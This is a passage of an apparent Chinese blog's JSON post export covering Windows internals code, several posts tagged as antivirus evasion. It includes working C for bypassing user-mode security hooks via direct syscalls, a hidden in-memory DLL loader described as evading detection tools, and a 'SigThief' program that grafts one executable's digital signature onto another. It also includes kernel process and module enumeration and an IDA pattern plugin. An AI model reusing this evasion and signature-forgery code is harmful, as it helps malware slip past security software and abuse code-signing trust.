未完待续","categories":[],"tags":[{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"},{"name":"笔记","slug":"笔记","permalink":"http://example.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"绕过所有三环钩子的办法","slug":"R3Unhook","date":"2021-07-19T16:47:33.000Z","updated":"2021-10-25T08:07:44.529Z","comments":true,"path":"2021/07/20/R3Unhook/","link":"","permalink":"http://example.com/2021/07/20/R3Unhook/","excerpt":"","text":"思路如下： 1、通过_KiFastSystemCall自己实现NtAllocateVirtualMemory与NtWriteVirtualMemory，由此绕过申请内存和读写内存的钩子 2、之后可以通过自己写的申请和读写完成内存载入的方法，然后载入ntdll.dll，取得每个需要导入的函数的硬编码。 3、通过自己调用硬编码即可完成对大部分钩子进行绕过。 #include &lt;stdio.h> #include &lt;Windows.h> NTSTATUS __declspec(naked) __stdcall NtAllocateVirtualMemory(__in HANDLE ProcessHandle, __inout PVOID* BaseAddress, __in ULONG_PTR ZeroBits, __inout PSIZE_T RegionSize, __in ULONG AllocationType, __in ULONG Protect) { __asm { mov eax, 13h mov edx, 7FFE0300h call dword ptr[edx] retn 18h }; } PVOID MyAllocVirtualMemory(ULONG_PTR Size) { PVOID BaseAddr = NULL; SIZE_T RegionSize = Size; HANDLE CurrentProc = GetCurrentProcess(); NTSTATUS status = NtAllocateVirtualMemory(CurrentProc, &amp;BaseAddr, NULL, &amp;RegionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); printf(\"status: %x, BaseAddr: %p\\r\\n\", BaseAddr, BaseAddr); return BaseAddr; } NTSTATUS __declspec(naked) __stdcall NtWriteVirtualMemory(__in HANDLE ProcessHandle, __in_opt PVOID BaseAddress, __in_bcount(BufferSize) CONST VOID* Buffer, __in SIZE_T BufferSize, __out_opt PSIZE_T NumberOfBytesWritten) { __asm { mov eax, 18Fh mov edx, 7FFE0300h call dword ptr[edx] retn 14h }; } SIZE_T MyWriteVirtualMemory(LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize) { SIZE_T RegionSize = nSize; SIZE_T RealWritten = NULL; HANDLE CurrentProc = GetCurrentProcess(); printf(\"lpBaseAddress: %p,lpBuffer: %p, nSize: %x\\r\\n\",lpBaseAddress,lpBuffer,nSize); NTSTATUS status = NtWriteVirtualMemory(CurrentProc, lpBaseAddress, lpBuffer, nSize, &amp;RealWritten); printf(\"Status: %x, RealWritten: %x\\r\\n\", status, RealWritten); return RealWritten; } int main() { PCH MyImage =(PCH)MyAllocVirtualMemory(0x1000); printf(\"MyImage: %p\\r\\n\", MyImage); MyWriteVirtualMemory(MyImage, \"HelloWorld!!!\\r\\n\", strlen(\"HelloWorld!!!\\r\\n\") + 1); system(\"pause\"); }","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"零环实现GetProcessByName","slug":"GetProcByName","date":"2021-07-19T03:28:35.000Z","updated":"2021-10-25T08:11:51.953Z","comments":true,"path":"2021/07/19/GetProcByName/","link":"","permalink":"http://example.com/2021/07/19/GetProcByName/","excerpt":"","text":"#include &lt;ntifs.h> PEPROCESS GetProcessByName(wchar_t * ProcessName) { if (!ProcessName || ProcessName [0]== 0)return NULL; PEPROCESS RetEprocess = NULL; int len = wcslen(ProcessName) * 2; wchar_t* pName = ExAllocatePool(PagedPool, len + 2); memset(pName, 0, len + 2); memcpy(pName, ProcessName, len); for (int i = 8; i &lt; 100000; i += 4) { PEPROCESS eprocess = NULL; NTSTATUS status = PsLookupProcessByProcessId((HANDLE)i, &amp;eprocess); if (!NT_SUCCESS(status))continue; PUNICODE_STRING unProcessName; status = SeLocateProcessImageName(eprocess, &amp;unProcessName); if(!NT_SUCCESS(status)) { ObDereferenceObject(eprocess); continue; } KdPrintEx((77, 0, \"ProcessName: %S\\r\\n\",unProcessName->Buffer)); if (wcsstr(unProcessName->Buffer, pName)) { RetEprocess = eprocess; //ExFreePool(unProcessName); ExFreePoolWithTag(unProcessName, 'fIeS'); break; } ExFreePoolWithTag(unProcessName, 'fIeS'); //ExFreePool(unProcessName); } ExFreePool(pName); return RetEprocess; } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { DbgPrint(\"--------Driver Unload -------------------\\r\\n\"); } NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); PEPROCESS eporocess = GetProcessByName(L\"explorer.exe\"); ObDereferenceObject(eporocess); pDriver->DriverUnload = DrivUnload; DbgPrint(\"--------Driver Loaded : %wZ--------------\\r\\n\", pReg); return STATUS_SUCCESS; } 效果如下：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"隐藏DLL内存加载","slug":"LoadDll","date":"2021-07-18T16:51:15.000Z","updated":"2021-10-25T08:09:31.481Z","comments":true,"path":"2021/07/19/LoadDll/","link":"","permalink":"http://example.com/2021/07/19/LoadDll/","excerpt":"","text":"本文通过内存加载的方式，完成了DLL在本进程内存的加载的过程。 #include &lt;stdio.h> #include &lt;Windows.h> HANDLE gProcess = NULL; LPVOID gDllAddr = NULL; typedef struct _IMAGE_RELOC { UINT16 Offset : 12; // 低12位---偏移 UINT16 Type : 4; // 高4位---类型 } IMAGE_RELOC, * PIMAGE_RELOC; typedef BOOL(APIENTRY* DLLMAIN)( HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved ); static LPVOID MemAlloc(LPVOID lpAddress, SIZE_T dwSize) { LPVOID lpMemAddress = VirtualAlloc(lpAddress, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (NULL == lpMemAddress) lpMemAddress = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); return lpMemAddress; } PUCHAR FileToImage(char* fileBuffer) { if (!fileBuffer) return NULL; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)fileBuffer; PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(fileBuffer + pDos->e_lfanew); ULONG sizeofImage = pNts->OptionalHeader.SizeOfImage; PUCHAR imageBuffer = (PUCHAR)MemAlloc(pNts->OptionalHeader.ImageBase,sizeofImage); memset(imageBuffer, 0, sizeofImage); memcpy(imageBuffer, fileBuffer, pNts->OptionalHeader.SizeOfHeaders); ULONG NumberOfSections = pNts->FileHeader.NumberOfSections; PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNts); for (ULONG i = 0; i &lt; NumberOfSections; i++) { memcpy(imageBuffer + pSection->VirtualAddress, fileBuffer + pSection->PointerToRawData, pSection->SizeOfRawData); pSection++; } return imageBuffer; } ULONG64 ExportTableFuncByName(char* pData, char* funcName) { PIMAGE_DOS_HEADER pHead = (PIMAGE_DOS_HEADER)pData; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pData + pHead->e_lfanew); int numberRvaAndSize = pNt->OptionalHeader.NumberOfRvaAndSizes; PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)&amp;pNt->OptionalHeader.DataDirectory[0]; PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pData + pDir->VirtualAddress); ULONG64 funcAddr = 0; for (int i = 0; i &lt; pExport->NumberOfNames; i++) { int* funcAddress = pData + pExport->AddressOfFunctions; int* names = pData + pExport->AddressOfNames; short* fh = pData + pExport->AddressOfNameOrdinals; int index = -1; char* name = pData + names[i]; if (strcmp(name, funcName) == 0) { index = fh[i]; } if (index != -1) { funcAddr = pData + funcAddress[index]; break; } } if (!funcAddr) { printf(\"can't find fun %s\\r\\n\", funcName); } else { printf(\"find fun %s addr %p\\r\\n\", funcName, funcAddr); } return funcAddr; } BOOLEAN UpdataRelocation(char* imageBuffer) { PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)imageBuffer; PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(imageBuffer + pDos->e_lfanew); if (!pNts) return FALSE; PIMAGE_DATA_DIRECTORY iRelocation = &amp;pNts->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]; PIMAGE_BASE_RELOCATION pBase = (PIMAGE_BASE_RELOCATION)(imageBuffer + iRelocation->VirtualAddress); while (pBase->SizeOfBlock &amp;&amp; pBase->VirtualAddress) { PIMAGE_RELOC RelocationBlock = (PIMAGE_RELOC)((PUCHAR)pBase + sizeof(IMAGE_BASE_RELOCATION)); UINT32 NumberOfRelocations = (pBase->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC); for (int i = 0; i &lt; NumberOfRelocations; i++) { if (RelocationBlock[i].Type == IMAGE_REL_BASED_DIR64) { // 64 位 PUINT64 Address = (PUINT64)((PUINT8)imageBuffer + pBase->VirtualAddress + RelocationBlock[i].Offset); UINT64 Delta = *Address - pNts->OptionalHeader.ImageBase + (PUINT8)imageBuffer; *Address = Delta; } else if (RelocationBlock[i].Type == IMAGE_REL_BASED_HIGHLOW) { PUINT32 Address = (PUINT32)((PUINT8)imageBuffer + pBase->VirtualAddress + (RelocationBlock[i].Offset)); UINT32 Delta = *Address - pNts->OptionalHeader.ImageBase + (PUINT8)imageBuffer; *Address = Delta; } } pBase = (PIMAGE_BASE_RELOCATION)((PUCHAR)pBase + pBase->SizeOfBlock); } return TRUE; } VOID UpdateCookie(char* imageBuffer) { if (!imageBuffer) return FALSE; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)imageBuffer; PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(imageBuffer + pDos->e_lfanew); if (!pNts) return FALSE; PIMAGE_DATA_DIRECTORY pConfigDir = &amp;pNts->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG]; PIMAGE_LOAD_CONFIG_DIRECTORY config = (PIMAGE_LOAD_CONFIG_DIRECTORY)(pConfigDir->VirtualAddress + imageBuffer); *(PULONG)(config->SecurityCookie) += 10; } BOOLEAN UpdataIAT(char* imageBuffer) { if (!imageBuffer) return FALSE; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)imageBuffer; PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(imageBuffer + pDos->e_lfanew); if (!pNts) return FALSE; PIMAGE_DATA_DIRECTORY pimportDir = &amp;pNts->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]; PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)(imageBuffer + pimportDir->VirtualAddress); BOOLEAN isSuccess = TRUE; for (; import->Name; import++) { PUCHAR libName = (imageBuffer + import->Name); ULONG_PTR base = LoadLibraryA(libName); if (!base) { isSuccess = FALSE; break; } PIMAGE_THUNK_DATA pThuckName = (PIMAGE_THUNK_DATA)(imageBuffer + import->OriginalFirstThunk); PIMAGE_THUNK_DATA pThuckFunc = (PIMAGE_THUNK_DATA)(imageBuffer + import->FirstThunk); for (; pThuckName->u1.ForwarderString; ++pThuckName, ++pThuckFunc) { PIMAGE_IMPORT_BY_NAME FuncName = (PIMAGE_IMPORT_BY_NAME)(imageBuffer + pThuckName->u1.AddressOfData); ULONG_PTR func = ExportTableFuncByName((char*)base, FuncName->Name); if (func) { pThuckFunc->u1.Function = (ULONG_PTR)func; } else { isSuccess = FALSE; break; } } if (!isSuccess) break; } return isSuccess; } int main(int argc,char *argv[]) { HANDLE hDll = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hDll) { wprintf(L\"Open hAbsolutePathA Error : %d\\r\\n\", GetLastError()); return 0; } DWORD DllSize = GetFileSize(hDll, NULL); PBYTE DllFileBuf = (PBYTE)malloc(DllSize); DWORD readSizeA = 0; if (!ReadFile(hDll, DllFileBuf, DllSize, &amp;readSizeA, NULL)) { wprintf(L\"ReadFile Dll Error : %d\\r\\n\", GetLastError()); return 0; } PUCHAR imageBase = FileToImage(DllFileBuf); if (!imageBase) return FALSE; BOOLEAN isSuccess = FALSE; do { isSuccess = UpdataRelocation(imageBase); if (!isSuccess) break; isSuccess = UpdataIAT(imageBase); if (!isSuccess) break; UpdateCookie(imageBase); PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)imageBase; PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(imageBase + pDos->e_lfanew); ULONG_PTR entry = ExportTableFuncByName(imageBase,\"_DllMain@12\"); DLLMAIN EntryPointFunc = (DLLMAIN)(entry); if (FALSE != EntryPointFunc((HMODULE)imageBase, DLL_PROCESS_ATTACH, NULL)) { return (HMODULE)imageBase; } memset(imageBase, 0, 0x1000); } while (0); return 0; } 实现效果如下,可以观察到PCHUNTER的进程模块无法检测到加载的DLL了。","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"}]},{"title":"内核模块枚举","slug":"listModules","date":"2021-07-17T11:10:01.000Z","updated":"2021-10-25T08:09:38.437Z","comments":true,"path":"2021/07/17/listModules/","link":"","permalink":"http://example.com/2021/07/17/listModules/","excerpt":"","text":"之前写过通过查链表的方式枚举驱动，这次实现是利用ZwQuerySystemInformation函数来对内核模块进行枚举。 同时实现了通过比较模块名找到指定的模块ModuleBase的功能。 首先定义头文件 //tools.h #pragma once #include &lt;ntifs.h> typedef enum _SYSTEM_INFORMATION_CLASS { SystemBasicInformation, SystemProcessorInformation, // obsolete...delete SystemPerformanceInformation, SystemTimeOfDayInformation, SystemPathInformation, SystemProcessInformation, SystemCallCountInformation, SystemDeviceInformation, SystemProcessorPerformanceInformation, SystemFlagsInformation, SystemCallTimeInformation, SystemModuleInformation, SystemLocksInformation, SystemStackTraceInformation, SystemPagedPoolInformation, SystemNonPagedPoolInformation, SystemHandleInformation, SystemObjectInformation, SystemPageFileInformation, SystemVdmInstemulInformation, SystemVdmBopInformation, SystemFileCacheInformation, SystemPoolTagInformation, SystemInterruptInformation, SystemDpcBehaviorInformation, SystemFullMemoryInformation, SystemLoadGdiDriverInformation, SystemUnloadGdiDriverInformation, SystemTimeAdjustmentInformation, SystemSummaryMemoryInformation, SystemMirrorMemoryInformation, SystemPerformanceTraceInformation, SystemObsolete0, SystemExceptionInformation, SystemCrashDumpStateInformation, SystemKernelDebuggerInformation, SystemContextSwitchInformation, SystemRegistryQuotaInformation, SystemExtendServiceTableInformation, SystemPrioritySeperation, SystemVerifierAddDriverInformation, SystemVerifierRemoveDriverInformation, SystemProcessorIdleInformation, SystemLegacyDriverInformation, SystemCurrentTimeZoneInformation, SystemLookasideInformation, SystemTimeSlipNotification, SystemSessionCreate, SystemSessionDetach, SystemSessionInformation, SystemRangeStartInformation, SystemVerifierInformation, SystemVerifierThunkExtend, SystemSessionProcessInformation, SystemLoadGdiDriverInSystemSpace, SystemNumaProcessorMap, SystemPrefetcherInformation, SystemExtendedProcessInformation, SystemRecommendedSharedDataAlignment, SystemComPlusPackage, SystemNumaAvailableMemory, SystemProcessorPowerInformation, SystemEmulationBasicInformation, SystemEmulationProcessorInformation, SystemExtendedHandleInformation, SystemLostDelayedWriteInformation, SystemBigPoolInformation, SystemSessionPoolTagInformation, SystemSessionMappedViewInformation, SystemHotpatchInformation, SystemObjectSecurityMode, SystemWatchdogTimerHandler, SystemWatchdogTimerInformation, SystemLogicalProcessorInformation, SystemWow64SharedInformation, SystemRegisterFirmwareTableInformationHandler, SystemFirmwareTableInformation, SystemModuleInformationEx, SystemVerifierTriageInformation, SystemSuperfetchInformation, SystemMemoryListInformation, SystemFileCacheInformationEx, MaxSystemInfoClass // MaxSystemInfoClass should always be the last enum } SYSTEM_INFORMATION_CLASS; typedef struct _RTL_PROCESS_MODULE_INFORMATION { HANDLE Section; // Not filled in PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256]; } RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION; typedef struct _RTL_PROCESS_MODULES { ULONG NumberOfModules; RTL_PROCESS_MODULE_INFORMATION Modules[1]; } RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES; NTSTATUS ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, void* SystemInformation, ULONG SystemInformationLength, ULONG* ReturnLength); PIMAGE_NT_HEADERS RtlImageNtHeader(void* Base); ULONG_PTR QueryModule(PUCHAR moduleName, ULONG_PTR* moduleSize); 然后实现函数： //tools.c #include \"tools.h\" ULONG_PTR QueryModule(PUCHAR moduleName,ULONG_PTR * moduleSize) { if (moduleName == NULL) return 0; RTL_PROCESS_MODULES rtlModules = { 0 }; PRTL_PROCESS_MODULES SystemMoudles = &amp;rtlModules; BOOLEAN isAllocate = FALSE; PULONG retlen = 0; NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation,&amp;rtlModules,sizeof(RTL_PROCESS_MODULES),&amp;retlen); if (status == STATUS_INFO_LENGTH_MISMATCH) { SystemMoudles = ExAllocatePool(PagedPool, retlen + sizeof(RTL_PROCESS_MODULES)); if (!SystemMoudles) return 0; memset(SystemMoudles, 0, retlen + sizeof(RTL_PROCESS_MODULES)); status = ZwQuerySystemInformation(SystemModuleInformation, SystemMoudles, retlen + sizeof(RTL_PROCESS_MODULES), &amp;retlen); if (!NT_SUCCESS(status)) { ExFreePool(SystemMoudles); return 0; } isAllocate = TRUE; } PUCHAR kernelModuleName = NULL; ULONG_PTR moudleBase = 0; do { if (_stricmp(moduleName, \"ntoskrnl.exe\") == 0 || _stricmp(moduleName, \"ntkrnlpa.exe\") == 0) { PRTL_PROCESS_MODULE_INFORMATION moudleInfo = &amp;SystemMoudles->Modules[0]; moudleBase = moudleInfo->ImageBase; if (moduleSize) *moduleSize = moudleInfo->ImageSize; break; } kernelModuleName = ExAllocatePool(PagedPool, strlen(moduleName) + 1); memset(kernelModuleName, 0, strlen(moduleName) + 1); memcpy(kernelModuleName, moduleName, strlen(moduleName)); _strupr(kernelModuleName); for (int i = 0; i &lt; SystemMoudles->NumberOfModules; i++) { PRTL_PROCESS_MODULE_INFORMATION moudleInfo = &amp;SystemMoudles->Modules[i]; PUCHAR pathName = _strupr(moudleInfo->FullPathName); DbgPrintEx(77, 0, \"baseName = %s,fullPath = %s\\r\\n\",moudleInfo->FullPathName + moudleInfo->OffsetToFileName, moudleInfo->FullPathName); if (strstr(pathName, kernelModuleName)) { moudleBase = moudleInfo->ImageBase; if (moduleSize) *moduleSize = moudleInfo->ImageSize; break; } } } while (0); if (kernelModuleName) { ExFreePool(kernelModuleName); } if (isAllocate) { ExFreePool(SystemMoudles); } return moudleBase; }","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"特征码插件 for IDA","slug":"IDAPartten","date":"2021-07-13T16:26:17.000Z","updated":"2021-10-25T08:10:41.122Z","comments":true,"path":"2021/07/14/IDAPartten/","link":"","permalink":"http://example.com/2021/07/14/IDAPartten/","excerpt":"","text":"# -*- coding: utf-8 -*- import math import idaapi import idc #import clipboard try: class Kp_Menu_Context(idaapi.action_handler_t): def __init__(self): idaapi.action_handler_t.__init__(self) @classmethod def get_name(self): return self.__name__ @classmethod def get_label(self): return self.label @classmethod def register(self, plugin, label): self.plugin = plugin self.label = label instance = self() return idaapi.register_action(idaapi.action_desc_t( self.get_name(), # Name. Acts as an ID. Must be unique. instance.get_label(), # Label. That's what users see. instance # Handler. Called when activated, and for updating )) @classmethod def unregister(self): \"\"\"Unregister the action. After unregistering the class cannot be used. \"\"\" idaapi.unregister_action(self.get_name()) @classmethod def activate(self, ctx): # dummy method return 1 @classmethod def update(self, ctx): if ctx.form_type == idaapi.BWN_DISASM: return idaapi.AST_ENABLE_FOR_FORM return idaapi.AST_DISABLE_FOR_FORM class Searcher(Kp_Menu_Context): def activate(self, ctx): self.plugin.search() return 1 except: pass class PatternGen_Plugin_t(idaapi.plugin_t): comment = \"Airshelf's Partten Tool\" help = \"...\" wanted_name = \"PatternGen\" wanted_hotkey = \"ALT+Z\" flags = idaapi.PLUGIN_KEEP def init(self): try: print (\"Airshelf's Partten Tool\\n==========================================\\nUsage:[Alt + Z]\") Searcher.register(self, \"PatternGen\") except: pass return idaapi.PLUGIN_KEEP def term(self): pass def printAvd(self): print (25 * \"===\") def formatByte(self,ea): return \" \"+\"{:02X}\".format(idc.get_wide_byte(ea)) def calcStr(self,ea, endcount): hstr = \"\" firstByte = self.formatByte(ea) hstr += self.formatByte(ea) hstr = hstr + self.formatByte(ea + 1) if (firstByte == \"FF\" or firstByte == \"66\" or firstByte == \"67\") else hstr #print(math.ceil(endcount - len(hstr) / 2)) hstr = hstr + math.ceil(endcount - len(hstr) / 2) * \" CC\" if endcount >= 2 else hstr return hstr def extractCode(self): self.printAvd() start = idc.read_selection_start() end = idc.read_selection_end() codeSize = end - start ea = start # print hex(ea) result = \"\" for i in range(codeSize): op1 = idc.get_operand_type(ea, 0) op2 = idc.get_operand_type(ea, 1) instructionSize = idc.get_item_size(ea) if op1 == idc.o_reg and (op2 == idc.o_reg or op2 == idc.o_void or op2 == idc.o_phrase): for b in range(0, instructionSize): result += self.formatByte(ea + b) elif (op1 == idc.o_reg and op2 == idc.o_displ) or (op1 == idc.o_displ and op2 == idc.o_reg) or ( op1 == idc.o_displ and op2 == idc.o_imm): result += self.formatByte(ea) + self.formatByte(ea + 1) for b in range(2, instructionSize): result = result + \" ??\" elif op1 == idc.o_phrase and op2 == idc.o_reg: for b in range(0, instructionSize): result += self.formatByte(ea + b) else: result += self.calcStr(ea, instructionSize) ea = ea + instructionSize if ea >= (start + codeSize): break # print (idc.get_event_module_base() - idc.SelStart()); print (\"%s Address:0x%x Offset:0x%x\" % (idc.get_func_name(idc.here()),idc.here(), idc.here() - idaapi.get_imagebase())) # print result return result def run(self, arg): if (idc.BADADDR != idc.here()): copyContent = self.extractCode(); print(copyContent) # clipboard.copy(copyContent) # register IDA plugin def PLUGIN_ENTRY(): return PatternGen_Plugin_t(); 热键： [ALT + Z]提取的特征码效果如下：","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"偷取数字签名","slug":"SigThief","date":"2021-07-13T16:22:13.000Z","updated":"2021-10-25T08:16:14.837Z","comments":true,"path":"2021/07/14/SigThief/","link":"","permalink":"http://example.com/2021/07/14/SigThief/","excerpt":"","text":"通过偷取PE区段的IMAGE_DIRECTORY_ENTRY_SECURITY从而完成数字签名的偷取 #include &lt;stdio.h> #include &lt;Windows.h> int main(int argc,char* argv[]) { if(argc != 3) { printf(\"[+] Usage: SigThief.exe SourceFile.exe TargetFile.exe\\r\\n\"); return 0; } PCH SourceFile = argv[1]; PCH TargetFile = argv[2]; printf(\"[+] SourceFile : %s\\r\\n\", SourceFile); printf(\"[+] TargetFile : %s\\r\\n\", TargetFile); do { char* sigMem = NULL; char* notSigMem = NULL; FILE* sigFile = NULL; FILE* notSigFile = NULL; fopen_s(&amp;sigFile, SourceFile, \"rb\"); if (!sigFile) { printf(\"SourceFile fopen failed [ErrCode]:%d\\r\\n\",GetLastError()); break; } fseek(sigFile, 0, SEEK_END); size_t sigFileLength = ftell(sigFile); rewind(sigFile); sigMem = (char*)malloc(sigFileLength); memset(sigMem, 0, sigFileLength); fread(sigMem, sigFileLength, 1, sigFile); fclose(sigFile); fopen_s(&amp;notSigFile, TargetFile, \"rb\"); if (!notSigFile) { free(sigMem); printf(\"TargetFile fopen failed [ErrCode]:%d\\r\\n\", GetLastError()); break; } fseek(notSigFile, 0, SEEK_END); size_t notSigFileLength = ftell(notSigFile); rewind(notSigFile); notSigMem = (char*)malloc(notSigFileLength); memset(notSigMem, 0, notSigFileLength); fread(notSigMem, notSigFileLength, 1, notSigFile); fclose(notSigFile); PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)sigMem; PIMAGE_NT_HEADERS pNts = (PIMAGE_NT_HEADERS)(sigMem + pDos->e_lfanew); PIMAGE_DOS_HEADER pDos1 = (PIMAGE_DOS_HEADER)notSigMem; PIMAGE_NT_HEADERS pNts1 = (PIMAGE_NT_HEADERS)(notSigMem + pDos1->e_lfanew); if (pNts1->Signature != 0x4550 || pNts->Signature != 0x4550) { free(sigMem); free(notSigMem); printf(\"File is not PE Format!!!\\r\\n\"); break; } if (pNts1->FileHeader.Machine != pNts->FileHeader.Machine) { free(sigMem); free(notSigMem); printf(\"PE Format Not Match!!!\\r\\n\"); break; } PUCHAR fw = NULL; ULONG fwisze = NULL; ULONG SigVirtualAddress = 0; ULONG sigSize = 0; if (pNts->OptionalHeader.Magic == 0x20B) { PIMAGE_NT_HEADERS64 pNts = (PIMAGE_NT_HEADERS64)(sigMem + pDos->e_lfanew); PIMAGE_DATA_DIRECTORY Pdir = &amp;pNts->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY]; SigVirtualAddress = Pdir->VirtualAddress; sigSize = Pdir->Size; fwisze = notSigFileLength + sigSize; fw = (PUCHAR)malloc(fwisze); memset(fw, 0, fwisze); memcpy(fw, notSigMem, notSigFileLength); } else { PIMAGE_DOS_HEADER pDos32 = (PIMAGE_DOS_HEADER)sigMem; PIMAGE_NT_HEADERS32 pNts32 = (PIMAGE_NT_HEADERS32)(sigMem + pDos32->e_lfanew); PIMAGE_DATA_DIRECTORY Pdir = &amp;pNts32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY]; SigVirtualAddress = Pdir->VirtualAddress; sigSize = Pdir->Size; fwisze = notSigFileLength + sigSize; fw = (PUCHAR)malloc(fwisze); memset(fw, 0, fwisze); memcpy(fw, notSigMem, notSigFileLength); } if (pNts1->OptionalHeader.Magic == 0x20B) { PIMAGE_DOS_HEADER pDos64w = (PIMAGE_DOS_HEADER)fw; PIMAGE_NT_HEADERS64 pNts64w = (PIMAGE_NT_HEADERS64)(fw + pDos64w->e_lfanew); PIMAGE_DATA_DIRECTORY Pdirw = &amp;pNts64w->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY]; PIMAGE_SECTION_HEADER pImageSection = IMAGE_FIRST_SECTION(pNts64w); pImageSection += (pNts64w->FileHeader.NumberOfSections - 1); ULONG VirtualAddressW = (pImageSection->PointerToRawData + pImageSection->SizeOfRawData); memcpy(fw + VirtualAddressW, sigMem + SigVirtualAddress, sigSize); Pdirw->VirtualAddress = VirtualAddressW; Pdirw->Size = sigSize; } else { PIMAGE_DOS_HEADER pDos32w = (PIMAGE_DOS_HEADER)fw; PIMAGE_NT_HEADERS pNts32w = (PIMAGE_NT_HEADERS)(fw + pDos32w->e_lfanew); PIMAGE_DATA_DIRECTORY Pdirw = &amp;pNts32w->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY]; PIMAGE_SECTION_HEADER pImageSection = IMAGE_FIRST_SECTION(pNts32w); pImageSection += (pNts32w->FileHeader.NumberOfSections - 1); ULONG VirtualAddressW = (pImageSection->PointerToRawData + pImageSection->SizeOfRawData); memcpy(fw + VirtualAddressW, sigMem + SigVirtualAddress, sigSize); Pdirw->VirtualAddress = VirtualAddressW; Pdirw->Size = sigSize; } free(notSigMem); free(sigMem); if (fw) { CHAR GenFilePath[MAX_PATH] = { 0 }; FILE* file = NULL; strcpy(GenFilePath, TargetFile); strcat(GenFilePath, \".bak\"); rename(TargetFile, GenFilePath); fopen_s(&amp;file, TargetFile, \"wb\"); if (!file) { free(fw); break; } fwrite(fw, fwisze, 1, file); fclose(file); free(fw); printf(\"[+] Success !!!\\r\\n\"); } } while (0); return 0; }","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"免杀","slug":"免杀","permalink":"http://example.com/tags/%E5%85%8D%E6%9D%80/"},{"name":"功能","slug":"功能","permalink":"http://example.com/tags/%E5%8A%9F%E8%83%BD/"}]},{"title":"目录监控","slug":"filewatcher","date":"2021-07-12T05:57:34.000Z","updated":"2021-10-25T08:17:21.889Z","comments":true,"path":"2021/07/12/filewatcher/","link":"","permalink":"http://example.com/2021/07/12/filewatcher/","excerpt":"","text":"#include &lt;iostream> #include &lt;Windows.h> void W2C(wchar_t* pwszSrc, int iSrcLen, char* pszDest, int iDestLen) { RtlZeroMemory(pszDest, iDestLen); WideCharToMultiByte(CP_ACP, 0, pwszSrc, (iSrcLen / 2), pszDest, iDestLen, NULL, NULL); } UINT MonitorFileThreadProc(LPVOID lpVoid) { char* pszDirectory = (char*)lpVoid; HANDLE hDirectory = CreateFileA(pszDirectory, FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL); if(hDirectory == INVALID_HANDLE_VALUE) { char szErr[MAX_PATH] 